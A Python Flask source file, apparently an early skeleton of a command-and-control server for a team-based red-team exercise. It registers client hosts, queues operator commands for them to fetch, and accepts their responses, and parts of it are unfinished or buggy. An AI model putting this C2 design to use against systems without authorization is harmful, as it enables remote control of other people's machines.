#Start a web server
#Take POST requests on /hosts/newHost with an IP and OS
#Assign host with hostname and return the identifier of the host
#Take GET requests on /hosts/IDENTIFIER/commands and return stored commands
#Take POST requests on /hosts/IDENTIFIER/responses and print responses

#TODO Accept CLI input (API)

from flask import Flask, request
import requests
import json
import threading
from serverDependencies.Host import Host
from serverDependencies.Team import Team
from serverDependencies.Hostname import Hostname

app = Flask(__name__) #Main webpage object

def runApp():
    """
    Runs the website on the specified IP and port.
    """
    app.run(host="127.0.0.1",port="8080")

@app.route("/") #HOMEPAGE
def homePage():
    """
    Returns the homepage at '/'
    """
    return "Homepage of C2"


@app.route("/hosts/")
def hostsPage():
    """
    Returns a list of current hosts
    """
    return "Host1\nHost2\nHost3"

@app.route("/hosts/<identifier>/commands")
def getCommands(identifier):
    """
    Returns a list of commands for the client to run
    """
    return HOSTS[identifier].queuedCommands

@app.route("/hosts/<identifier>/responses", methods=["POST"])
def getResponse(identifier):
    """
    Accepts a POST request for the client to send responses to
    """
    return f"{identifier} - Thanks!"

@app.route("/hosts/newHost", methods=["POST"])
def newHost():
    """
    Takes in data from a POST request and returns an identifier.
    """
    data = request.get_json()
    IP = data["IP"]
    OS = data["OS"]
    hostname = getHostnameByIP(IP)
    team = getTeamByIP(IP)
    host = Host(IP,OS,hostname,team)
    if hostname != "unknown":
        HOSTNAMES[hostname].activeHosts.append(host)
    TEAMS[team].activeHosts.append(host)
    if hostname == "unknown" and team == "unknown":
        global UNKNOWN_COUNT
        UNKNOWN_COUNT += 1
        host.id += str(UNKNOWN_COUNT)
    HOSTS[host.id] = host
    return f"HOSTNAME = {host.id}"

def getHostnameByIP(IP):
    for host in HOSTNAMES: #Iterate over expected hosts
        if IP in HOSTNAMES[host].expectedHosts: #If the IP is in the expected clients list, we found the correct host
            return host
    return "unknown"

def getTeamByIP(IP):
    for team in TEAMS:
        if IP in TEAMS[team].expectedHosts:
            return team
    return "unknown"
    
def parseConfig():
    """
    Iterates over 'config.json' and stores necessary information
    """
    try:
        with open("config.json") as config:
            config = json.load(config) #Load the config file
        global NUM_OF_TEAMS
        NUM_OF_TEAMS = int(config["topology"][0]["teams"]) #Pull the # of all teams
        global SERVER_ADDR
        SERVER_ADDR = config["topology"][0]["serverIP"]
        for i in range(1,NUM_OF_TEAMS): #Create all teams and give them a list of expected clients
            TEAMS[str(i)] = Team(str(i))
            print("Created team: " + str(i))
        TEAMS["unknown"] = Team("unknown") #unknown team for clients that don't fit config
        global HOSTNAMES
        HOSTNAMES = dict()
        for i in range(len(config["hosts"])):
            currentHost = config["hosts"][i]
            createHost(currentHost)
        global UNKNOWN_COUNT
        UNKNOWN_COUNT = 0
    except Exception as e:
        print("Could not parse config file! Please restart C2 with the correct format!\n" + str(e))

def createHost(host):
    hostname = host["hostname"]
    ip = host["ip"]
    os = host["os"]
    # services = host["service"]
    HOSTNAMES[hostname] = Hostname(hostname,ip,os)
    for i in range(1,NUM_OF_TEAMS):
        expectedHost = ip.replace("x",str(i))
        HOSTNAMES[hostname].expectedHosts.append(expectedHost)
        print(f"[SERVER] Added host: {expectedHost} to HOSTNAME {hostname}")
    for team in TEAMS:
        tempIP = ip.replace("x",team)
        TEAMS[team].expectedHosts.append(tempIP)
        print(f"[SERVER] Added host: {expectedHost} to TEAM {team}")

def main():
    website = threading.Thread(target=runApp)
    website.daemon = True
    global HOSTS
    HOSTS = dict()
    global TEAMS
    TEAMS = dict()
    parseConfig()
    website.start()
    while 1:
        command = input("Enter a command: ")
        HOSTS["unknown.unknown1"].addCommand(command)

if __name__ == "__main__":
    main()